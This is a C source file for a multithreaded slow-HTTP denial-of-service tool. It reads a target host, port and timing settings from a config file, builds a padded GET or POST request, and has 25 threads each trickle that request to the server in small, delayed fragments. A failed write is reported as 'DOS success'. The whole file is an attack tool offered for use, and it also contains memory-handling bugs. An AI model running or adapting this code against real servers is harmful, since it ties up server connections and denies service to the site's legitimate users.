/* Includes */
#include <stdio.h>
#include <stdlib.h>
#include <string.h> // memcpy, memset

#include <pthread.h> // c-posix threads library
#include <sys/socket.h> // socket, connect
#include <unistd.h> // read, write, close

#include <netinet/in.h> // struct sockaddr_in, struct sockaddr
#include <netdb.h> // struct hostent, gethostbyname

/* Structures */
typedef struct _ThreadBody
{
  int codeInteger;
  char* codeString;

  char* color;
} ThreadBody;

/* Constants */
#define CONFIGURATION_FILE "config.txt"
#define NUMBER_THREADS 25
#define BLANK_LINE "\r\n"
#define FILE_BUFFER_SIZE 255

// Colors used char*
#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"

/* Global variables */
char* ip;
int port;

char* httpMethod;
char* httpURL;
char* httpParameters;
char* httpHeaders;

int timeToSleep;
int dataSize;
int fragmentSize;

struct hostent* server;
struct sockaddr_in serv_addr;

char* request;

pthread_t myThreads[NUMBER_THREADS];

/* Methods */
char* GetColor(int threadCode)
{
  switch(threadCode % 6) // there is only 6 colors available: 3 of rgb and 3 of cmy
  {
    case 0:
      return KRED;
      break;
    case 1:
      return KGRN;
      break;
    case 2:
      return KYEL;
      break;
    case 3:
      return KBLU;
      break;
    case 4:
      return KMAG;
      break;
    case 5:
      return KCYN;
      break;
  }
}

void SeeConfigurationRead()
{
  printf("%s\n", ip);
  printf("%d\n", port);

  printf("%s\n", httpMethod);
  printf("%s\n", httpURL);
  printf("%s\n", httpParameters);
  printf("%s\n", httpHeaders);

  printf("%d\n", timeToSleep);
  printf("%d\n", dataSize);
  printf("%d\n", fragmentSize);
}

void ReadFile(FILE* file)
{
  char fileBuffer[FILE_BUFFER_SIZE];
  int readFile;

  // ip
  readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  ip = malloc(strlen(fileBuffer));
  strncpy(ip, fileBuffer, strlen(fileBuffer) - 1); // except new line

  // port
  readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  port = (int) strtol(fileBuffer, (char **)NULL, 10);

  // httpMethod
  readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  httpMethod = malloc(strlen(fileBuffer));
  strncpy(httpMethod, fileBuffer, strlen(fileBuffer) - 1); // except new line

  // httpURL
  readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  httpURL = malloc(strlen(fileBuffer));
  strncpy(httpURL, fileBuffer, strlen(fileBuffer) - 1);

  // timeToSleep
  readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  timeToSleep = (int) strtol(fileBuffer, (char **)NULL, 10);

  // dataSize
  readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  dataSize = (int) strtol(fileBuffer, (char **)NULL, 10);

  // fragmentSize
  readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  fragmentSize = (int) strtol(fileBuffer, (char **)NULL, 10);

  // httpParameters
  httpParameters = malloc(dataSize);
  httpParameters[0] = 'v';
	httpParameters[1] = 'a';
	httpParameters[2] = 'r';
	httpParameters[3] = '=';

  int i;
	for(i = 4; i < dataSize; i++)
	{
		httpParameters[i] = 'b';
	}

  // httpHeaders
  //readFile = fgets(fileBuffer, FILE_BUFFER_SIZE, (FILE*)file);
  //httpHeaders = malloc(strlen(fileBuffer));
  //strncpy(httpHeaders, fileBuffer, strlen(fileBuffer) - 1);
  httpHeaders = "Content-Type: application/x-www-form-urlencoded";
}

void BuildRequest()
{
  int requestSize = 0;
  if(!strcmp(httpMethod, "GET"))
  {
		requestSize += strlen("%s %s%s%s HTTP/1.0") + strlen(BLANK_LINE);
    requestSize += strlen(httpURL);
    requestSize += strlen(httpHeaders);

    requestSize += strlen(httpParameters);
    requestSize += strlen(httpHeaders) + strlen(BLANK_LINE);
    requestSize += strlen(BLANK_LINE);
  }
  else
  {
    requestSize += strlen("%s %s HTTP/1.0") + strlen(BLANK_LINE);
    requestSize += strlen(httpURL);
    requestSize += strlen(httpHeaders);

    requestSize += strlen(httpHeaders) + strlen(BLANK_LINE);

    requestSize += strlen("Content-Length: %d") + strlen(BLANK_LINE) + 10;

    requestSize += strlen(BLANK_LINE);
    requestSize+=strlen(httpParameters);                  /* body           */
  }

  request = malloc(requestSize);
  strcpy(request, "");
  //printf("RequestSize requested: %d\n", requestSize);

  if(!strcmp(httpMethod,"GET"))
  {
    strcat(request, httpMethod);
    strcat(request, " ");
    strcat(request, httpURL);
    strcat(request, "?");
    strcat(request, httpParameters);
    strcat(request, " HTTP/1.0");
    strcat(request, BLANK_LINE);

    strcat(request, httpHeaders);
    strcat(request, BLANK_LINE);
    strcat(request, BLANK_LINE);                              /* blank line     */
  }
  else
  {
    strcat(request, httpMethod);
    strcat(request, " ");
    strcat(request, httpURL);
    strcat(request, " HTTP/1.0");
    strcat(request, BLANK_LINE);

    strcat(request, httpHeaders);
    strcat(request, BLANK_LINE);

    strcat(request, "Content-Length: ");

    char* aux = malloc(10); // array of 10 bytes - 10 characters
    sprintf(aux, "%d", dataSize);
    strcat(request, aux);

    strcat(request, BLANK_LINE);
    strcat(request, BLANK_LINE);

    strcat(request, httpParameters);
  }

  //printf("Request:\n%s\n", request);
  //printf("Final request size: %d\n", strlen(request));
}

void ShowError(char* msg, ThreadBody* tB)
{
  char* show = malloc( sizeof(msg) + 100); // msg + 2 colors
  strcpy(show, tB->color);
  strcat(show, "[Thread ");
  strcat(show, tB->codeString);
  strcat(show, "] ");
  strcat(show, KNRM);
  strcat(show, msg);

  printf("%s\n", show);
}

void GetResponse(ThreadBody* tB)
{
  // create the socket
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0)
  {
    ShowError("ERROR opening socket", tB);


    return;
  }

  // connect the socket
  if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0)
  {
    ShowError("ERROR connecting", tB);
    return;
  }

  // send the request
  int requestSize = strlen(request);
  int sent = 0;
  int fragmentNumber = 0;

  do
  {
    int bytes = write(sockfd, request+sent, fragmentSize); //requestSize - sent);
    if (bytes < 0) // could not read
    {
      ShowError("ERROR writing message to socket -> DOS success", tB);
      //perror("ERROR writing message to socket -> DOS success");

      /* close the socket */
      close(sockfd);
      return;
    }

    if (bytes == 0) // nothing more to read
      break;

    sent += bytes;
    fragmentNumber++;

    printf("%s[Thread %s] Fragment %d sent.%s\n", tB->color, tB->codeString, fragmentNumber, KNRM);

    sleep(timeToSleep);
  } while (sent < requestSize);

  // receive the response
  char* response[4096];
  memset(response, 0, sizeof(response));

  int total = sizeof(response)-1;
  int received = 0;
  do
  {
    int bytes = read(sockfd, response+received, total-received);
    if (bytes < 0) // could not read
    {
      ShowError("ERROR reading response from socket", tB);
    }

    if (bytes == 0) // noting more to read
      break;

    received+=bytes;
  } while (received < total);

  if (received == total)
    ShowError("ERROR storing complete response from socket", tB);

  /* close the socket */
  close(sockfd);

  /* process response */
  printf("%s[Thread %s] Response:\n%s%s\n", tB->color, tB->codeString, response, KNRM);

  // free memory
  /*int index;
  for(index = 0; index < 4096; index++)
  {
    free(response[index]);
  }*/
}

void* ThreadBehaviour(void* tB)
{
  ThreadBody* threadBody = (ThreadBody*)tB;

  GetResponse(threadBody);

  return NULL;
}

/* Main Function */
int main(int argc, char** argv)
{
  system("clear");

  // process program arguments
  char* configurationFile;
  if(argc == 1) // if configuration file not defined, use default one
  {
    configurationFile = CONFIGURATION_FILE;
  }
  else
  {
      if(argc == 2)
      {
        configurationFile = argv[1];
      }
  }

  // process configuration file content
  FILE* file = fopen( configurationFile, "r" );
  if(file == NULL) // not such file
  {
    perror("Error: No such file exists.\n");
    exit(0);
  }

  ReadFile(file);
  //SeeConfigurationRead();

  fclose(file);

  // trying to lookup the server ip address and build the structure
  server = gethostbyname(ip);
  if (server == NULL)
		perror("ERROR: no such host");

  memset(&serv_addr,0,sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(port);
  memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);

  // define request message
  BuildRequest();

  // create and run all threads
  int index;
	for(index = 0; index < NUMBER_THREADS; index++)
	{
		ThreadBody* threadBody = (ThreadBody*)malloc(sizeof(ThreadBody));
    threadBody->codeInteger = index;
    threadBody->color = GetColor(index);
    threadBody->codeString = malloc(3);
    sprintf(threadBody->codeString, "%d", index);

		printf("Thread %d created\n", index );
		if(pthread_create(&myThreads[index], NULL, ThreadBehaviour, threadBody))
		{
			fprintf(stderr, "ERROR: creating thread\n");
			return -1;
		}
	}

	// main waits for other threads to end
	for(index = 0; index < NUMBER_THREADS; index++)
	{
		pthread_join(myThreads[index], NULL);
	}

	printf("Main thread finished.\n");

  // free memory
  /*free(ip);

  free(httpMethod);
  free(httpURL);
  free(httpParameters);
  free(httpHeaders);

  free(request);*/

  return 0;
}
